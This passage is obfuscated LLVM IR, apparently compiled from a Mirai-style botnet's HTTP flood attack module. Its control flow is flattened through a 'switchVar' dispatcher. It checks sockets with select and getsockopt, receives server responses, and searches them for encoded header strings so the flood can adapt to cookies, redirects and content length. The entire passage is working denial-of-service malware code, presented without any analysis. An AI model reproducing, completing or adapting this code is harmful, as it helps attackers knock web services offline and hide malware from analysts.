; <label>:1004:                                   ; preds = %loopEntry
  store i32 127342235, i32* %switchVar
  br label %loopEnd

; <label>:1005:                                   ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1512946799, i32* %switchVar
  br label %loopEnd

; <label>:1006:                                   ; preds = %loopEntry
  %1007 = load i32, i32* %9, align 4
  %1008 = load i32, i32* %18, align 4
  %1009 = icmp slt i32 %1007, %1008
  %1010 = select i1 %1009, i32 1744473883, i32 -93813881
  store i32 %1010, i32* %switchVar
  br label %loopEnd

; <label>:1011:                                   ; preds = %loopEntry
  %1012 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %1013 = load i32, i32* %9, align 4
  %1014 = sext i32 %1013 to i64
  %1015 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1012, i64 %1014
  store %struct.attack_http_state* %1015, %struct.attack_http_state** %26, align 8
  %1016 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1017 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1016, i32 0, i32 0
  %1018 = load i32, i32* %1017, align 4
  %1019 = icmp eq i32 %1018, -1
  %1020 = select i1 %1019, i32 1013885723, i32 2049023066
  store i32 %1020, i32* %switchVar
  br label %loopEnd

; <label>:1021:                                   ; preds = %loopEntry
  store i32 -1530442444, i32* %switchVar
  br label %loopEnd

; <label>:1022:                                   ; preds = %loopEntry
  %1023 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %1024 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1025 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1024, i32 0, i32 0
  %1026 = load i32, i32* %1025, align 4
  %1027 = sdiv i32 %1026, 64
  %1028 = sext i32 %1027 to i64
  %1029 = getelementptr inbounds [16 x i64], [16 x i64]* %1023, i64 0, i64 %1028
  %1030 = load i64, i64* %1029, align 8
  %1031 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1032 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1031, i32 0, i32 0
  %1033 = load i32, i32* %1032, align 4
  %1034 = srem i32 %1033, 64
  %1035 = zext i32 %1034 to i64
  %1036 = shl i64 1, %1035
  %1037 = and i64 %1030, %1036
  %1038 = icmp ne i64 %1037, 0
  %1039 = select i1 %1038, i32 1871763204, i32 -157092710
  store i32 %1039, i32* %switchVar
  br label %loopEnd

; <label>:1040:                                   ; preds = %loopEntry
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %1041 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1042 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1041, i32 0, i32 0
  %1043 = load i32, i32* %1042, align 4
  %1044 = bitcast i32* %35 to i8*
  %1045 = call i32 @getsockopt(i32 %1043, i32 1, i32 4, i8* %1044, i32* %36) #6
  store i32 %1045, i32* %12, align 4
  %1046 = load i32, i32* %35, align 4
  %1047 = icmp eq i32 %1046, 0
  %1048 = select i1 %1047, i32 -1912608929, i32 -2040816761
  store i32 %1048, i32* %switchVar
  br label %loopEnd

; <label>:1049:                                   ; preds = %loopEntry
  %1050 = load i32, i32* %12, align 4
  %1051 = icmp eq i32 %1050, 0
  %1052 = select i1 %1051, i32 948755891, i32 -2040816761
  store i32 %1052, i32* %switchVar
  br label %loopEnd

; <label>:1053:                                   ; preds = %loopEntry
  %1054 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1055 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1054, i32 0, i32 1
  store i8 4, i8* %1055, align 4
  store i32 488877835, i32* %switchVar
  br label %loopEnd

; <label>:1056:                                   ; preds = %loopEntry
  %1057 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1058 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1057, i32 0, i32 0
  %1059 = load i32, i32* %1058, align 4
  %1060 = call i32 @close(i32 %1059)
  %1061 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1062 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1061, i32 0, i32 0
  store i32 -1, i32* %1062, align 4
  %1063 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1064 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1063, i32 0, i32 1
  store i8 0, i8* %1064, align 4
  store i32 -1530442444, i32* %switchVar
  br label %loopEnd

; <label>:1065:                                   ; preds = %loopEntry
  store i32 -157092710, i32* %switchVar
  br label %loopEnd

; <label>:1066:                                   ; preds = %loopEntry
  %1067 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1068 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1069 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1068, i32 0, i32 0
  %1070 = load i32, i32* %1069, align 4
  %1071 = sdiv i32 %1070, 64
  %1072 = sext i32 %1071 to i64
  %1073 = getelementptr inbounds [16 x i64], [16 x i64]* %1067, i64 0, i64 %1072
  %1074 = load i64, i64* %1073, align 8
  %1075 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1076 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1075, i32 0, i32 0
  %1077 = load i32, i32* %1076, align 4
  %1078 = srem i32 %1077, 64
  %1079 = zext i32 %1078 to i64
  %1080 = shl i64 1, %1079
  %1081 = and i64 %1074, %1080
  %1082 = icmp ne i64 %1081, 0
  %1083 = select i1 %1082, i32 -1994555764, i32 -1140609847
  store i32 %1083, i32* %switchVar
  br label %loopEnd

; <label>:1084:                                   ; preds = %loopEntry
  %1085 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1086 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1085, i32 0, i32 1
  %1087 = load i8, i8* %1086, align 4
  %1088 = zext i8 %1087 to i32
  %1089 = icmp eq i32 %1088, 6
  %1090 = select i1 %1089, i32 108360560, i32 1981760368
  store i32 %1090, i32* %switchVar
  br label %loopEnd

; <label>:1091:                                   ; preds = %loopEntry
  store i32 0, i32* %37, align 4
  %1092 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %1092, i32 10240)
  %1093 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1094 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1093, i32 0, i32 0
  %1095 = load i32, i32* %1094, align 4
  %1096 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1097 = call i64 @recv(i32 %1095, i8* %1096, i64 10240, i32 16386)
  %1098 = trunc i64 %1097 to i32
  store i32 %1098, i32* %12, align 4
  %1099 = icmp slt i32 %1098, 1
  %1100 = select i1 %1099, i32 -1375021392, i32 1866007490
  store i32 %1100, i32* %switchVar
  br label %loopEnd

; <label>:1101:                                   ; preds = %loopEntry
  %1102 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1103 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1102, i32 0, i32 0
  %1104 = load i32, i32* %1103, align 4
  %1105 = call i32 @close(i32 %1104)
  %1106 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1107 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1106, i32 0, i32 0
  store i32 -1, i32* %1107, align 4
  %1108 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1109 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1108, i32 0, i32 1
  store i8 0, i8* %1109, align 4
  store i32 -1530442444, i32* %switchVar
  br label %loopEnd

; <label>:1110:                                   ; preds = %loopEntry
  %1111 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1112 = load i32, i32* %12, align 4
  %1113 = call i32 @util_memsearch(i8* %1111, i32 %1112, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1114 = icmp eq i32 %1113, -1
  %1115 = select i1 %1114, i32 364104155, i32 -1710377805
  store i32 %1115, i32* %switchVar
  br label %loopEnd

; <label>:1116:                                   ; preds = %loopEntry
  %1117 = load i32, i32* %12, align 4
  %1118 = icmp slt i32 %1117, 10240
  %1119 = select i1 %1118, i32 448186264, i32 -1710377805
  store i32 %1119, i32* %switchVar
  br label %loopEnd

; <label>:1120:                                   ; preds = %loopEntry
  store i32 -1530442444, i32* %switchVar
  br label %loopEnd

; <label>:1121:                                   ; preds = %loopEntry
  %1122 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1123 = load i32, i32* %12, align 4
  %1124 = call i32 @util_memsearch(i8* %1122, i32 %1123, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1125 = sext i32 %1124 to i64
  %1126 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1125
  store i8 0, i8* %1126, align 1
  %1127 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1128 = load i32, i32* %12, align 4
  %1129 = call i8* @table_retrieve_val(i32 53, i32* null)
  %1130 = call i32 @util_stristr(i8* %1127, i32 %1128, i8* %1129)
  %1131 = icmp ne i32 %1130, -1
  %1132 = select i1 %1131, i32 -846411053, i32 -1027532206
  store i32 %1132, i32* %switchVar
  br label %loopEnd

; <label>:1133:                                   ; preds = %loopEntry
  %1134 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1135 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1134, i32 0, i32 11
  store i32 2, i32* %1135, align 4
  store i32 -1027532206, i32* %switchVar
  br label %loopEnd

; <label>:1136:                                   ; preds = %loopEntry
  %1137 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1138 = load i32, i32* %12, align 4
  %1139 = call i8* @table_retrieve_val(i32 52, i32* null)
  %1140 = call i32 @util_stristr(i8* %1137, i32 %1138, i8* %1139)
  %1141 = icmp ne i32 %1140, -1
  %1142 = select i1 %1141, i32 898292782, i32 107098610
  store i32 %1142, i32* %switchVar
  br label %loopEnd

; <label>:1143:                                   ; preds = %loopEntry
  %1144 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1145 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1144, i32 0, i32 11
  store i32 1, i32* %1145, align 4
  store i32 107098610, i32* %switchVar
  br label %loopEnd

; <label>:1146:                                   ; preds = %loopEntry
  %1147 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1148 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1147, i32 0, i32 12
  store i32 0, i32* %1148, align 4
  %1149 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1150 = load i32, i32* %12, align 4
  %1151 = call i8* @table_retrieve_val(i32 51, i32* null)
  %1152 = call i32 @util_stristr(i8* %1149, i32 %1150, i8* %1151)
  %1153 = icmp ne i32 %1152, -1
  %1154 = select i1 %1153, i32 507631937, i32 1585637071
  store i32 %1154, i32* %switchVar
  br label %loopEnd

; <label>:1155:                                   ; preds = %loopEntry
  %1156 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1157 = load i32, i32* %12, align 4
  %1158 = call i8* @table_retrieve_val(i32 51, i32* null)
  %1159 = call i32 @util_stristr(i8* %1156, i32 %1157, i8* %1158)
  store i32 %1159, i32* %38, align 4
  %1160 = load i32, i32* %38, align 4
  %1161 = sext i32 %1160 to i64
  %1162 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1161
  %1163 = load i8, i8* %1162, align 1
  %1164 = sext i8 %1163 to i32
  %1165 = icmp eq i32 %1164, 32
  %1166 = select i1 %1165, i32 -1278064352, i32 1304773016
  store i32 %1166, i32* %switchVar
  br label %loopEnd

; <label>:1167:                                   ; preds = %loopEntry
  %1168 = load i32, i32* %38, align 4
  %1169 = add nsw i32 %1168, 1
  store i32 %1169, i32* %38, align 4
  store i32 1304773016, i32* %switchVar
  br label %loopEnd

; <label>:1170:                                   ; preds = %loopEntry
  %1171 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1172 = load i32, i32* %38, align 4
  %1173 = sext i32 %1172 to i64
  %1174 = getelementptr inbounds i8, i8* %1171, i64 %1173
  %1175 = load i32, i32* %12, align 4
  %1176 = load i32, i32* %38, align 4
  %1177 = sub nsw i32 %1175, %1176
  %1178 = call i32 @util_memsearch(i8* %1174, i32 %1177, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1178, i32* %39, align 4
  %1179 = load i32, i32* %39, align 4
  %1180 = icmp ne i32 %1179, -1
  %1181 = select i1 %1180, i32 -823287154, i32 -853679323
  store i32 %1181, i32* %switchVar
  br label %loopEnd

; <label>:1182:                                   ; preds = %loopEntry
  %1183 = load i32, i32* %38, align 4
  %1184 = sext i32 %1183 to i64
  %1185 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1184
  store i8* %1185, i8** %40, align 8
  %1186 = load i32, i32* %39, align 4
  %1187 = icmp sge i32 %1186, 2
  %1188 = select i1 %1187, i32 1284478468, i32 163074014
  store i32 %1188, i32* %switchVar
  br label %loopEnd

; <label>:1189:                                   ; preds = %loopEntry
  %1190 = load i32, i32* %39, align 4
  %1191 = sub nsw i32 %1190, 2
  store i32 %1191, i32* %39, align 4
  store i32 163074014, i32* %switchVar
  br label %loopEnd

; <label>:1192:                                   ; preds = %loopEntry
  %1193 = load i32, i32* %38, align 4
  %1194 = load i32, i32* %39, align 4
  %1195 = add nsw i32 %1193, %1194
  %1196 = sext i32 %1195 to i64
  %1197 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1196
  store i8 0, i8* %1197, align 1
  %1198 = load i8*, i8** %40, align 8
  %1199 = load i8*, i8** %40, align 8
  %1200 = call i32 @util_strlen(i8* %1199)
  %1201 = call i8* @table_retrieve_val(i32 50, i32* null)
  %1202 = call i32 @util_stristr(i8* %1198, i32 %1200, i8* %1201)
  %1203 = icmp ne i32 %1202, 0
  %1204 = select i1 %1203, i32 -1068453726, i32 1006167907
  store i32 %1204, i32* %switchVar
  br label %loopEnd

; <label>:1205:                                   ; preds = %loopEntry
  %1206 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1207 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1206, i32 0, i32 12
  store i32 1, i32* %1207, align 4
  store i32 1006167907, i32* %switchVar
  br label %loopEnd

; <label>:1208:                                   ; preds = %loopEntry
  store i32 -853679323, i32* %switchVar
  br label %loopEnd

; <label>:1209:                                   ; preds = %loopEntry
  store i32 1585637071, i32* %switchVar
  br label %loopEnd

; <label>:1210:                                   ; preds = %loopEntry
  %1211 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1212 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1211, i32 0, i32 13
  store i32 0, i32* %1212, align 4
  %1213 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1214 = load i32, i32* %12, align 4
  %1215 = call i8* @table_retrieve_val(i32 48, i32* null)
  %1216 = call i32 @util_stristr(i8* %1213, i32 %1214, i8* %1215)
  %1217 = icmp ne i32 %1216, -1
  %1218 = select i1 %1217, i32 -768309194, i32 1456000232
  store i32 %1218, i32* %switchVar
  br label %loopEnd

; <label>:1219:                                   ; preds = %loopEntry
  %1220 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1221 = load i32, i32* %12, align 4
  %1222 = call i8* @table_retrieve_val(i32 48, i32* null)
  %1223 = call i32 @util_stristr(i8* %1220, i32 %1221, i8* %1222)
  store i32 %1223, i32* %41, align 4
  %1224 = load i32, i32* %41, align 4
  %1225 = sext i32 %1224 to i64
  %1226 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1225
  %1227 = load i8, i8* %1226, align 1
  %1228 = sext i8 %1227 to i32
  %1229 = icmp eq i32 %1228, 32
  %1230 = select i1 %1229, i32 903276030, i32 -123193842
  store i32 %1230, i32* %switchVar
  br label %loopEnd

; <label>:1231:                                   ; preds = %loopEntry
  %1232 = load i32, i32* %41, align 4
  %1233 = add nsw i32 %1232, 1
  store i32 %1233, i32* %41, align 4
  store i32 -123193842, i32* %switchVar
  br label %loopEnd

; <label>:1234:                                   ; preds = %loopEntry
  %1235 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1236 = load i32, i32* %41, align 4
  %1237 = sext i32 %1236 to i64
  %1238 = getelementptr inbounds i8, i8* %1235, i64 %1237
  %1239 = load i32, i32* %12, align 4
  %1240 = load i32, i32* %41, align 4
  %1241 = sub nsw i32 %1239, %1240
  %1242 = call i32 @util_memsearch(i8* %1238, i32 %1241, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1242, i32* %42, align 4
  %1243 = load i32, i32* %42, align 4
  %1244 = icmp ne i32 %1243, -1
  %1245 = select i1 %1244, i32 732711679, i32 -1381590006
  store i32 %1245, i32* %switchVar
  br label %loopEnd

; <label>:1246:                                   ; preds = %loopEntry
  %1247 = load i32, i32* %41, align 4
  %1248 = sext i32 %1247 to i64
  %1249 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1248
  store i8* %1249, i8** %43, align 8
  %1250 = load i32, i32* %42, align 4
  %1251 = icmp sge i32 %1250, 2
  %1252 = select i1 %1251, i32 95423078, i32 -1883955555
  store i32 %1252, i32* %switchVar
  br label %loopEnd

; <label>:1253:                                   ; preds = %loopEntry
  %1254 = load i32, i32* %42, align 4
  %1255 = sub nsw i32 %1254, 2
  store i32 %1255, i32* %42, align 4
  store i32 -1883955555, i32* %switchVar
  br label %loopEnd

; <label>:1256:                                   ; preds = %loopEntry
  %1257 = load i32, i32* %41, align 4
  %1258 = load i32, i32* %42, align 4
  %1259 = add nsw i32 %1257, %1258
  %1260 = sext i32 %1259 to i64
  %1261 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1260
  store i8 0, i8* %1261, align 1
  %1262 = load i8*, i8** %43, align 8
  %1263 = load i8*, i8** %43, align 8
  %1264 = call i32 @util_strlen(i8* %1263)
  %1265 = call i8* @table_retrieve_val(i32 49, i32* null)
  %1266 = call i32 @util_stristr(i8* %1262, i32 %1264, i8* %1265)
  %1267 = icmp ne i32 %1266, 0
  %1268 = select i1 %1267, i32 -1097979833, i32 -1533065696
  store i32 %1268, i32* %switchVar
  br label %loopEnd

; <label>:1269:                                   ; preds = %loopEntry
  %1270 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1271 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1270, i32 0, i32 13
  store i32 1, i32* %1271, align 4
  store i32 -1533065696, i32* %switchVar
  br label %loopEnd

; <label>:1272:                                   ; preds = %loopEntry
  store i32 -1381590006, i32* %switchVar
  br label %loopEnd

; <label>:1273:                                   ; preds = %loopEntry
  store i32 1456000232, i32* %switchVar
  br label %loopEnd

; <label>:1274:                                   ; preds = %loopEntry
  %1275 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1276 = load i32, i32* %12, align 4
  %1277 = call i8* @table_retrieve_val(i32 47, i32* null)
  %1278 = call i32 @util_stristr(i8* %1275, i32 %1276, i8* %1277)
  %1279 = icmp ne i32 %1278, -1
  %1280 = select i1 %1279, i32 -1087453947, i32 1179696455
  store i32 %1280, i32* %switchVar
  br label %loopEnd

; <label>:1281:                                   ; preds = %loopEntry
  %1282 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1283 = load i32, i32* %12, align 4
  %1284 = call i8* @table_retrieve_val(i32 47, i32* null)
  %1285 = call i32 @util_stristr(i8* %1282, i32 %1283, i8* %1284)
  store i32 %1285, i32* %44, align 4
  %1286 = load i32, i32* %44, align 4
  %1287 = sext i32 %1286 to i64
  %1288 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1287
  %1289 = load i8, i8* %1288, align 1
  %1290 = sext i8 %1289 to i32
  %1291 = icmp eq i32 %1290, 32
  %1292 = select i1 %1291, i32 1107588745, i32 -497300866
  store i32 %1292, i32* %switchVar
  br label %loopEnd

; <label>:1293:                                   ; preds = %loopEntry
  %1294 = load i32, i32* %44, align 4
  %1295 = add nsw i32 %1294, 1
  store i32 %1295, i32* %44, align 4
  store i32 -497300866, i32* %switchVar
  br label %loopEnd

; <label>:1296:                                   ; preds = %loopEntry
  %1297 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1298 = load i32, i32* %44, align 4
  %1299 = sext i32 %1298 to i64
  %1300 = getelementptr inbounds i8, i8* %1297, i64 %1299
  %1301 = load i32, i32* %12, align 4
  %1302 = load i32, i32* %44, align 4
  %1303 = sub nsw i32 %1301, %1302
  %1304 = call i32 @util_memsearch(i8* %1300, i32 %1303, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1304, i32* %45, align 4
  %1305 = load i32, i32* %45, align 4
  %1306 = icmp ne i32 %1305, -1
  %1307 = select i1 %1306, i32 16379822, i32 -601490464
  store i32 %1307, i32* %switchVar
  br label %loopEnd

; <label>:1308:                                   ; preds = %loopEntry
  %1309 = load i32, i32* %44, align 4
  %1310 = sext i32 %1309 to i64
  %1311 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1310
  store i8* %1311, i8** %46, align 8
  %1312 = load i32, i32* %45, align 4
  %1313 = icmp sge i32 %1312, 2
  %1314 = select i1 %1313, i32 1663870826, i32 -280464080
  store i32 %1314, i32* %switchVar
  br label %loopEnd

; <label>:1315:                                   ; preds = %loopEntry
  %1316 = load i32, i32* %45, align 4
  %1317 = sub nsw i32 %1316, 2
  store i32 %1317, i32* %45, align 4
  store i32 -280464080, i32* %switchVar
  br label %loopEnd

; <label>:1318:                                   ; preds = %loopEntry
  %1319 = load i32, i32* %44, align 4
  %1320 = load i32, i32* %45, align 4
  %1321 = add nsw i32 %1319, %1320
  %1322 = sext i32 %1321 to i64
  %1323 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1322
  store i8 0, i8* %1323, align 1
  %1324 = load i8*, i8** %46, align 8
  %1325 = call i32 @util_atoi(i8* %1324, i32 10)
  %1326 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1327 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1326, i32 0, i32 14
  store i32 %1325, i32* %1327, align 4
  store i32 -601490464, i32* %switchVar
  br label %loopEnd

; <label>:1328:                                   ; preds = %loopEntry
  store i32 1807533966, i32* %switchVar
  br label %loopEnd

; <label>:1329:                                   ; preds = %loopEntry
  %1330 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1331 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1330, i32 0, i32 14
  store i32 0, i32* %1331, align 4
  store i32 1807533966, i32* %switchVar
  br label %loopEnd

; <label>:1332:                                   ; preds = %loopEntry
  store i32 0, i32* %37, align 4
  store i32 1709250680, i32* %switchVar
  br label %loopEnd

; <label>:1333:                                   ; preds = %loopEntry
  %1334 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1335 = load i32, i32* %37, align 4
  %1336 = sext i32 %1335 to i64
  %1337 = getelementptr inbounds i8, i8* %1334, i64 %1336
  %1338 = load i32, i32* %12, align 4
  %1339 = call i8* @table_retrieve_val(i32 46, i32* null)
  %1340 = call i32 @util_stristr(i8* %1337, i32 %1338, i8* %1339)
  %1341 = icmp ne i32 %1340, -1
  %1342 = select i1 %1341, i32 1248125187, i32 -139174004
  store i32 %1342, i32* %switchVar
  store i1 false, i1* %.reg2mem17
  br label %loopEnd

; <label>:1343:                                   ; preds = %loopEntry
  %1344 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1345 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1344, i32 0, i32 15
  %1346 = load i32, i32* %1345, align 4
  %1347 = icmp slt i32 %1346, 5
  store i32 -139174004, i32* %switchVar
  store i1 %1347, i1* %.reg2mem17
  br label %loopEnd

; <label>:1348:                                   ; preds = %loopEntry
  %.reload18 = load i1, i1* %.reg2mem17
  %1349 = select i1 %.reload18, i32 1809299807, i32 1362736826
  store i32 %1349, i32* %switchVar
  br label %loopEnd

; <label>:1350:                                   ; preds = %loopEntry
  %1351 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1352 = load i32, i32* %37, align 4
  %1353 = sext i32 %1352 to i64
  %1354 = getelementptr inbounds i8, i8* %1351, i64 %1353
  %1355 = load i32, i32* %12, align 4
  %1356 = call i8* @table_retrieve_val(i32 46, i32* null)
  %1357 = call i32 @util_stristr(i8* %1354, i32 %1355, i8* %1356)
  store i32 %1357, i32* %47, align 4
  %1358 = load i32, i32* %37, align 4
  %1359 = load i32, i32* %47, align 4
  %1360 = add nsw i32 %1358, %1359
  %1361 = sext i32 %1360 to i64
  %1362 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1361
  %1363 = load i8, i8* %1362, align 1
  %1364 = sext i8 %1363 to i32
  %1365 = icmp eq i32 %1364, 32
  %1366 = select i1 %1365, i32 -1026509296, i32 631387193
  store i32 %1366, i32* %switchVar
  br label %loopEnd

; <label>:1367:                                   ; preds = %loopEntry
  %1368 = load i32, i32* %47, align 4
  %1369 = add nsw i32 %1368, 1
  store i32 %1369, i32* %47, align 4
  store i32 631387193, i32* %switchVar
  br label %loopEnd

; <label>:1370:                                   ; preds = %loopEntry
  %1371 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1372 = load i32, i32* %37, align 4
  %1373 = sext i32 %1372 to i64
  %1374 = getelementptr inbounds i8, i8* %1371, i64 %1373
  %1375 = load i32, i32* %47, align 4
  %1376 = sext i32 %1375 to i64
  %1377 = getelementptr inbounds i8, i8* %1374, i64 %1376
  %1378 = load i32, i32* %12, align 4
  %1379 = load i32, i32* %37, align 4
  %1380 = sub nsw i32 %1378, %1379
  %1381 = load i32, i32* %47, align 4
  %1382 = sub nsw i32 %1380, %1381
  %1383 = call i32 @util_memsearch(i8* %1377, i32 %1382, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1383, i32* %48, align 4
  %1384 = load i32, i32* %48, align 4
  %1385 = icmp ne i32 %1384, -1
  %1386 = select i1 %1385, i32 -41142005, i32 -1062452684
  store i32 %1386, i32* %switchVar
  br label %loopEnd

; <label>:1387:                                   ; preds = %loopEntry
  %1388 = load i32, i32* %37, align 4
  %1389 = load i32, i32* %47, align 4
  %1390 = add nsw i32 %1388, %1389
  %1391 = sext i32 %1390 to i64
  %1392 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1391
  store i8* %1392, i8** %49, align 8
  %1393 = load i32, i32* %48, align 4
  %1394 = icmp sge i32 %1393, 2
  %1395 = select i1 %1394, i32 1409513339, i32 350318397
  store i32 %1395, i32* %switchVar
  br label %loopEnd

; <label>:1396:                                   ; preds = %loopEntry
  %1397 = load i32, i32* %48, align 4
  %1398 = sub nsw i32 %1397, 2
  store i32 %1398, i32* %48, align 4
  store i32 350318397, i32* %switchVar
  br label %loopEnd

; <label>:1399:                                   ; preds = %loopEntry
  %1400 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1401 = load i32, i32* %37, align 4
  %1402 = sext i32 %1401 to i64
  %1403 = getelementptr inbounds i8, i8* %1400, i64 %1402
  %1404 = load i32, i32* %47, align 4
  %1405 = sext i32 %1404 to i64
  %1406 = getelementptr inbounds i8, i8* %1403, i64 %1405
  %1407 = load i32, i32* %12, align 4
  %1408 = load i32, i32* %37, align 4
  %1409 = sub nsw i32 %1407, %1408
  %1410 = load i32, i32* %47, align 4
  %1411 = sub nsw i32 %1409, %1410
  %1412 = call i32 @util_memsearch(i8* %1406, i32 %1411, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1413 = icmp sgt i32 %1412, 0
  %1414 = select i1 %1413, i32 -866308487, i32 1197129682
  store i32 %1414, i32* %switchVar
  br label %loopEnd

; <label>:1415:                                   ; preds = %loopEntry
  %1416 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1417 = load i32, i32* %37, align 4
  %1418 = sext i32 %1417 to i64
  %1419 = getelementptr inbounds i8, i8* %1416, i64 %1418
  %1420 = load i32, i32* %47, align 4
  %1421 = sext i32 %1420 to i64
  %1422 = getelementptr inbounds i8, i8* %1419, i64 %1421
  %1423 = load i32, i32* %12, align 4
  %1424 = load i32, i32* %37, align 4
  %1425 = sub nsw i32 %1423, %1424
  %1426 = load i32, i32* %47, align 4
  %1427 = sub nsw i32 %1425, %1426
  %1428 = call i32 @util_memsearch(i8* %1422, i32 %1427, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %1429 = sub nsw i32 %1428, 1
  store i32 %1429, i32* %48, align 4
  store i32 1197129682, i32* %switchVar
  br label %loopEnd

